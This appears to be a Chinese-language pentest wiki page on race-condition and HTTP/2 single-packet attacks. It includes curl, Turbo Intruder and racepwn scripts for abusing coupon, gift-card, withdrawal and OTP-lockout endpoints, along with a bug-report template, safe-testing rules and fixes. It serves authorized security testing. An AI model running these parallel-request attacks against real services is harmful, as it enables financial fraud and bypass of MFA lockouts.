---
type: wiki
category: attack
tool: burp,turbo-intruder
status: active
last-updated: 2026-04-21
---

# Race Condition / Single-Packet Attack

> **用途：** 近年 PortSwigger 重點研究。Coupon redeem / 2FA bypass / OTP brute / IDOR differential 等高獎金漏洞。
> 2023 HTTP/2 single-packet attack 技術把 network jitter 降到 1ms 內，過去「不可能 race」的場景全部活了。

## 0. 原理（TOCTOU）

```
Thread A: read balance (100)
Thread B: read balance (100)
Thread A: balance -= 50 (50)
Thread A: write balance (50)
Thread B: balance -= 50 (50)   ← 以為 balance 是 100
Thread B: write balance (50)   ← 實際應該是 0

Result: user spent 100 但只扣 50
```

適合的場景：
- Coupon / voucher 只能用一次
- 提現 / 轉帳 / withdraw
- 限量搶購
- 邀請碼
- 2FA / OTP verification
- Like / Follow 數量
- Friend / invite acceptance

## 1. 傳統 race（curl xargs parallel）

```bash
# 40 個並行 request
seq 1 40 | xargs -P 40 -I{} curl -sk -X POST \
  "https://target.com/api/coupon/redeem" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"code":"SAVE10"}'

# 看 success 有幾個（正常應只有 1）
```

問題：每個 request 獨立 TCP handshake，network jitter 可能 50-200ms，抵銷 race window。

## 2. Single-Packet Attack（2023 突破）

Burp / Turbo Intruder 可把 N 個 HTTP/2 request 的 frame 全部塞進同一個 TCP packet，server 一瞬間收到全部 → jitter 消除。

### Burp Repeater Group

```
1. 右鍵 request → "Send to Repeater"
2. 複製 N 次，加到同一個 Repeater Group（右上 + → "Create tab group"）
3. 下拉改 "Send group in parallel (single-packet attack)"
4. Send
```

這是 2026 年測 race 的**最簡單方法**。

### Turbo Intruder（scripted）

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=1,
        engine=Engine.BURP2
    )

    req = '''POST /api/coupon/redeem HTTP/2
Host: target.com
Authorization: Bearer TOKEN
Content-Type: application/json
Content-Length: 18

{"code":"SAVE10"}'''

    for i in range(30):
        engine.queue(req)

    engine.start(timeout=5)

def handleResponse(req, interesting):
    if 'success' in req.response:
        table.add(req)
```

## 3. Classic Patterns

### 3.1 Coupon redeem race

```
POST /api/coupon/redeem  (30 parallel)
→ 通常 server 檢查 "coupon.used == false" → used=true → 儲存
→ Race 時 30 個 request 都看到 used=false → 30 個都扣優惠
```

### 3.2 MFA brute bypass

MFA 常限制「5 次錯誤就鎖」。但 lock counter 也有 race window：

```
送 10000 個 OTP 嘗試 (single-packet)
→ Server 只累加幾次 failed_count
→ 10000 次裡面命中就 pass
```

### 3.3 Withdraw / transfer 超額

```
balance: $100
並發 10 次 withdraw $50
→ 成功 5-10 次 → 提走 $250-500
```

### 3.4 Like / vote 灌票

```
POST /api/post/123/like (100 parallel, same user)
→ 成功多次
```

### 3.5 Gift card redemption

```
POST /api/giftcard/redeem (30 parallel, same code)
→ 多個帳號各自收到 balance
```

### 3.6 Friend request / invite

```
POST /api/invite/accept  (20 parallel, same invite link)
→ 一張票多人接受
```

### 3.7 Signup 多帳號同 email

```
POST /signup (10 parallel, email=x@x.com)
→ email uniqueness check 被繞，多帳號註冊
```

### 3.8 Password reset token reuse

```
POST /reset-password (20 parallel, same token)
→ 舊密碼 reset 多次 or 同 token 重用
```

## 4. 進階：Delay-based race

某些 race 需要先讓 server 卡住一段時間，Burp 的 "Gate" 可把 request 留在 TCP socket，等全部就位再同時釋放。

### Burp Turbo Intruder gate pattern

```python
def queueRequests(target):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=30,
        engine=Engine.THREADED
    )

    req = '...'
    for i in range(30):
        engine.queue(req, gate='race1')

    engine.openGate('race1')   # 同時釋放
```

## 5. Detection：怎麼知道有沒有 race

### 5.1 Response status diff

```
30 parallel → 若所有 200 → 可能有 race
30 parallel → 29x 429/409 + 1x 200 → rate limit OK
```

### 5.2 State diff

送完後去查資料：
```
before: balance=100, coupon_used=false
after:  balance=0 (或負數), coupon 有多筆 redeem
```

### 5.3 Timing

送完看 response 時間：
- 無 race：request 順序處理（150ms, 300ms, 450ms, ...）
- 有 race：幾乎同一時間（150ms, 152ms, 155ms, ...）

## 6. 工具鏈

| 工具 | 用途 | 難度 |
|------|------|------|
| **Burp Repeater group**（single-packet）| 手動 20-30 req race | ⭐ 入門 |
| **Turbo Intruder** | script 化，可大量 + gate | ⭐⭐ 中 |
| **racepwn** | Go CLI，無 Burp | ⭐⭐ |
| **curl xargs** | 最基本，jitter 大 | ⭐ |
| **nuclei**（有限）| 不推薦 race | — |

### Turbo Intruder 裝法

```
Burp Extender → BApp Store → "Turbo Intruder" → Install
右鍵 request → "Send to Turbo Intruder"
```

### racepwn

```bash
# https://github.com/racepwn/racepwn
go install github.com/racepwn/racepwn@latest

cat > race.json << EOF
{
  "race": {
    "type": "http",
    "count": 30
  },
  "http": {
    "ssl": true,
    "port": 443,
    "host": "target.com",
    "request": "POST /api/coupon/redeem HTTP/1.1\r\nHost: target.com\r\n\r\n{\"code\":\"X\"}"
  }
}
EOF

racepwn -c race.json
```

## 7. 實戰完整 PoC

### Case: Gift card code 重用

假設目標：`POST /api/giftcard/redeem` 一張卡應只能兌一次。

### Step 1: 正常兌換一次
```
POST /api/giftcard/redeem
{"code":"GC-ABCD-1234"}
→ 200 {"balance": 50.00, "added": 50.00}
```

### Step 2: 再兌一次（確認不能重複）
```
POST /api/giftcard/redeem
{"code":"GC-ABCD-1234"}
→ 400 {"error":"already redeemed"}
```

### Step 3: Reset balance（重開一張 test code，假設可取新）

### Step 4: Race（30 parallel, Burp group）
```
Result:
- 12 × 200 OK ({"added": 50})
- 18 × 400 already redeemed

balance 實際 += 600（12 × 50），應該只 +50
```

### Step 5: 報告

## 8. 報告 template

```markdown
## 漏洞概述
https://target.com/api/giftcard/redeem 未對 gift card 兌換做 row-lock /
database transaction atomicity 保證，single-packet attack 30 並發可兌換同一張
gift card 多次，將 $50 的 card value 放大為 $600。

## 重現步驟

### Step 1: 取得 test gift card code
[購買方式或 admin 提供]

### Step 2: 正常兌換一次
curl -X POST https://target.com/api/giftcard/redeem \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"code":"GC-TEST"}'
→ balance +50

### Step 3: 第二次正常兌換（會被拒）
→ 400 already_redeemed

### Step 4: Reset + race
- Burp Repeater Group × 30 copies
- Send in parallel (single-packet attack)

### Step 5: 結果
- 12 × HTTP 200 (already redeemed)
- Wallet balance +600 instead of +50

## Impact
- Gift card code monetary multiplication (12x in test)
- 任何 1 張 $50 card 可放大為 $600+
- 估計每次測試造成 $550 loss to company

## Severity
P2 / High（若是 monetary asset → P1）
```

## 9. 安全測試守則

1. ✅ 先用 test account + test coupon / test amount
2. ❌ 不在 production 影響其他使用者 balance
3. ❌ 不做大額 withdraw 測試（即使是自己帳戶，合規風險）
4. ✅ PoC 用最小金額（$1、$5）
5. ✅ 附上 cleanup 建議（退還 race 獲利）

## 10. 防禦角度（寫修補建議用）

```
1. DB-level unique constraint（status + code）
2. SELECT ... FOR UPDATE（row lock）
3. Optimistic locking (version field)
4. Redis SETNX 分散式 lock
5. Rate limiting per-endpoint + per-user
6. Idempotency key 設計
```

## 關聯文件

- [17-graphql-deep-attacks.md](17-graphql-deep-attacks.md) § 4 Alias overload — 也是 race 的一種
- PortSwigger Race Conditions Lab：https://portswigger.net/web-security/race-conditions
- Turbo Intruder docs：https://github.com/PortSwigger/turbo-intruder
- racepwn：https://github.com/racepwn/racepwn
- James Kettle "Smashing the state machine"：https://portswigger.net/research/smashing-the-state-machine
